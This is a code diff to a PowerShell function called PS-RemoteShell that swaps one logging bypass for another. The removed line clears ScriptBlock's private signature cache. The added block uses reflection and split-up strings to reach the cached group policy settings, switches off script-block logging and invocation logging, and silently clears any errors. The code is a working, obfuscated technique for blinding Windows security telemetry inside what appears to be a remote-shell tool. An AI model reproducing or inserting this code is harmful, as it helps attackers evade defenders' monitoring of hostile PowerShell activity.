@@ -116,7 +116,14 @@ function PS-RemoteShell {
 	)
    
 	BEGIN {
-		[ScriptBlock]."GetFiel`d"('signatures',"N"+"onP"+"ublic,St"+"atic").SetValue($null,(New-Object Collections.Generic.HashSet[string]))
+		Try {
+			$Settings = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cache'+'dGrou'+'pPoli'+'cySettings', 'No'+'nPub'+'lic,Static')
+			$Policy = $Settings.GetValue($null)
+			$Policy['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
+			$Policy['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
+		} Catch {
+			$error.Clear()
+		}
 	}
 
 	PROCESS {
